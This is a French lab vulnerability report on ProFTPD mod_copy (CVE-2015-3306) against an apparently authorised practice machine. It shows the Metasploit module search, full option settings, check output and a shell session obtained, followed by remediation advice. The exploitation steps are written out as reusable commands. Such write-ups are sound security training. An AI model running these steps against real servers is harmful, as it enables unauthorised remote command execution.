# Fiche Vulnérabilité N°02 — ProFTPD mod_copy (CVE-2015-3306)

## 1. Contexte et Identification
- **Service cible** : ProFTPD (serveur FTP alternatif)
- **Port d'écoute FTP** : `2121/tcp`
- **Port d'exécution web associé** : `8080/tcp` (Apache / PHP 7.4.3)
- **Version détectée** : `ProFTPD 1.3.5a`
- **Référence CVE** : `CVE-2015-3306`
- **Score CVSS v3** : `9.8 (Critique)` — Vecteur : `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Cible autorisée** : ESGIS VulnBox (`10.1.0.1`)

---

## 2. Démarche Méthodologique & Observations

### A. Détection initiale (Nmap)
Le scan de caractérisation réseau (`reports/nmap-services.txt`) a mis en évidence le service suivant sur le port non standard `2121` :
```text
PORT     STATE SERVICE VERSION
2121/tcp open  ftp     ProFTPD 1.3.5a
```

### B. Recherche du module sous Metasploit
```text
msf6 > search proftpd 1.3.5

Matching Modules
================
   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_modcopy_exec  2015-04-22       excellent  Yes    ProFTPD 1.3.5 - 'mod_copy' Remote Command Execution
```

### C. Analyse technique du module (`info`)
- **Mécanisme de la faille** : Le module `mod_copy` de ProFTPD 1.3.5 permet à un utilisateur **non authentifié** d'émettre les commandes personnalisées `SITE CPFR` (*Copy From*) et `SITE CPTO` (*Copy To*).
- **Vecteur d'exploitation combinée** : Le service FTP est utilisé pour copier un payload PHP arbitraire vers la racine d'un serveur web local (`/var/www/html`), qui est ensuite exécuté par une requête HTTP GET.

### D. Paramétrage spécifique
Ce module requiert de distinguer le port FTP du port web :
```text
msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 10.1.0.1
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RPORT_FTP 2121
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RPORT 8080
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST 10.1.0.6
```

### E. Contrôle passif (`check`)
La commande `check` a confirmé sans ambiguïté la présence de la vulnérabilité :
```text
[+] 10.1.0.1:8080 - The target appears to be vulnerable. 10.1.0.1:2121 - Unauthenticated SITE CPFR command was successful
```

### F. Exécution contrôlée (`run`)
La commande `run` a envoyé les instructions de copie, déposé le fichier PHP et ouvert une session interactive (`Command shell session 1 opened`).

---

## 3. Preuves Réelles

### Capture d'écran 1 — Configuration des options et validation du port
![Configuration du module proftpd_modcopy](../../screenshots/04-vulnerabilites/vuln-02-exec.png)

### Capture d'écran 2 — Preuve technique / Session interactive (PoC)
![Preuve de concept ProFTPD mod_copy](../../screenshots/05-resultats/vuln-02-poc.png)

### Résultat technique observé :
- Déclenchement de la copie sans authentification via `mod_copy`.
- Exécution du script interprété par Apache/PHP sur le port `8080`.
- Établissement d'une session shell interactive active sur la machine hôte (`vulnbox.ouritek.lab`).

---

## 4. Mesures Correctives et Remédiation

- **Mise à niveau du paquet** : Mettre à jour ProFTPD vers une version corrigée (≥ 1.3.6).
- **Désactivation du module mod_copy** : Si la mise à jour immédiate n'est pas possible, désactiver explicitement le chargement de `mod_copy.c` dans la configuration `/etc/proftpd/modules.conf` :
  ```apache
  # LoadModule mod_copy.c
  ```
- **Durcissement des permissions du système de fichiers** :
  - Veiller à ce que l'utilisateur exécutant le service FTP n'ait aucun droit d'écriture dans l'arborescence des sites web (`/var/www/html`).
  - Cloisonner les répertoires FTP dans un environnement chroot (`DefaultRoot ~`).
- **Filtrage réseau** : Fermer le port alternatif `2121/tcp` s'il ne répond à aucun besoin de production justifié.

---
**Statut actuel** : ✅ **Validé, testé et documenté avec succès**
